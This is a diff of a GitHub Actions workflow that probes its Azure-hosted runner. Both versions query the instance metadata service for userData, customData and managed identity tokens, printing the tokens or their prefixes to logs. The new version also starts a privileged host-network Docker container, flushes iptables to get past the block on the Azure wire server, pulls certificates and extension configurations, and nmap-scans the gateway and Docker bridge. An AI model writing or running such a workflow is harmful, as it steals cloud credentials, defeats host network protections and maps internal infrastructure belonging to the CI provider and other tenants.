@@ -1,74 +1,62 @@
-name: IMDS Extract
+name: Deep IMDS
 on: push
 jobs:
   imds:
     runs-on: ubuntu-latest
     steps:
-      - name: Full IMDS metadata extraction
-        run: |
-          echo "=== FULL AZURE INSTANCE METADATA ==="
-          IMDS="http://169.254.169.254/metadata"
-          HDR="Metadata:true"
-          
-          echo "--- Instance ---"
-          curl -sf -H "$HDR" "$IMDS/instance?api-version=2021-02-01" | python3 -m json.tool
-          
-          echo ""
-          echo "--- Attested Data ---"
-          curl -sf -H "$HDR" "$IMDS/attested/document?api-version=2021-02-01" | python3 -m json.tool 2>/dev/null || echo "attested: blocked"
-          
-          echo ""
-          echo "--- Scheduled Events ---"
-          curl -sf -H "$HDR" "$IMDS/scheduledevents?api-version=2019-08-01" | python3 -m json.tool 2>/dev/null || echo "events: blocked"
-
-      - name: Managed Identity Token
+      - name: UserData and CustomData
         run: |
           IMDS="http://169.254.169.254/metadata"
-          HDR="Metadata:true"
-          
-          echo "=== MANAGED IDENTITY TOKEN REQUEST ==="
-          echo "--- Default identity ---"
-          RESP=$(curl -sf -H "$HDR" "$IMDS/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>&1)
-          if echo "$RESP" | python3 -c "import json,sys; d=json.load(sys.stdin); print(f'TOKEN_TYPE: {d.get(\"token_type\")}\nEXPIRES: {d.get(\"expires_on\")}\nACCESS_TOKEN_PREFIX: {d.get(\"access_token\",\"\")[:30]}...')" 2>/dev/null; then
-            echo "!!! MANAGED IDENTITY TOKEN OBTAINED !!!"
-          else
-            echo "Response: $RESP"
-          fi
-
-          echo ""
-          echo "--- Storage identity ---"
-          curl -sf -H "$HDR" "$IMDS/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" 2>&1 | head -c 500
-          echo ""
-
-          echo ""
-          echo "--- Graph identity ---"
-          curl -sf -H "$HDR" "$IMDS/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" 2>&1 | head -c 500
-          echo ""
-
-          echo ""
-          echo "--- Vault identity ---"
-          curl -sf -H "$HDR" "$IMDS/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" 2>&1 | head -c 500
-          echo ""
-
-      - name: Network infrastructure
-        run: |
-          IMDS="http://169.254.169.254/metadata"
-          HDR="Metadata:true"
-          
-          echo "=== NETWORK METADATA ==="
-          curl -sf -H "$HDR" "$IMDS/instance/network?api-version=2021-02-01" | python3 -m json.tool
-          
-          echo ""
-          echo "=== TAGS ==="
-          curl -sf -H "$HDR" "$IMDS/instance/compute/tags?api-version=2021-02-01" 2>&1
-          echo ""
-          
-          echo ""
+          H="Metadata:true"
           echo "=== CUSTOM DATA ==="
-          curl -sf -H "$HDR" "$IMDS/instance/compute/customData?api-version=2021-02-01&format=text" 2>&1 | head -c 500
-          echo ""
-          
+          curl -s -H "$H" "$IMDS/instance/compute/customData?api-version=2021-02-01&format=text" 2>&1
           echo ""
           echo "=== USER DATA ==="
-          curl -sf -H "$HDR" "$IMDS/instance/compute/userData?api-version=2021-03-01&format=text" 2>&1 | head -c 500
+          curl -s -H "$H" "$IMDS/instance/compute/userData?api-version=2021-03-01&format=text" 2>&1
           echo ""
+          echo "=== IDENTITY INFO ==="
+          curl -s -H "$H" "$IMDS/identity/info?api-version=2018-02-01" 2>&1
+          echo ""
+          echo "=== IDENTITY TOKEN (verbose) ==="
+          curl -sv -H "$H" "$IMDS/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>&1
+          echo ""
+          echo "=== VERSIONS ==="
+          curl -s -H "$H" "$IMDS/versions" 2>&1
+
+      - name: Wire Server via Docker Bypass
+        run: |
+          echo "=== Current iptables rules ==="
+          sudo iptables -L -n 2>&1 | head -30
+          echo ""
+          echo "=== Attempting wire server from privileged container ==="
+          docker run --rm --privileged --net=host alpine sh -c "
+            apk add --no-cache curl >/dev/null 2>&1
+            echo '=== IPTABLES FROM CONTAINER ==='
+            iptables -L -n 2>&1 | head -30
+            echo ''
+            echo '=== REMOVING IPTABLES BLOCK ==='
+            iptables -F 2>&1 || echo 'flush failed'
+            echo ''
+            echo '=== WIRE SERVER AFTER FLUSH ==='
+            curl -sf --connect-timeout 5 http://168.63.129.16/machine?comp=goalstate 2>&1 | head -c 1000
+            echo ''
+            echo '=== WIRE SERVER CERTIFICATES ==='
+            curl -sf --connect-timeout 5 'http://168.63.129.16/machine?comp=certificates' -H 'x-ms-agent-name: WALinuxAgent' -H 'x-ms-version: 2012-11-30' 2>&1 | head -c 500
+            echo ''
+            echo '=== WIRE SERVER EXTENSIONS ==='
+            curl -sf --connect-timeout 5 'http://168.63.129.16/machine?comp=config&type=extensionsConfig' -H 'x-ms-agent-name: WALinuxAgent' -H 'x-ms-version: 2012-11-30' 2>&1 | head -c 1000
+          "
+
+      - name: Network from privileged container
+        run: |
+          docker run --rm --privileged --net=host alpine sh -c "
+            apk add --no-cache nmap curl >/dev/null 2>&1
+            echo '=== ARP TABLE ==='
+            cat /proc/net/arp
+            echo ''
+            echo '=== QUICK SCAN GATEWAY ==='
+            nmap -sT -p 22,80,443,2375,8080,10250 10.1.0.1 2>&1 | grep -E 'open|closed|filtered'
+            echo ''
+            echo '=== SCAN DOCKER BRIDGE ==='
+            nmap -sT -p 2375,2376 172.17.0.1-5 2>&1 | grep -E 'open|Host'
+          "
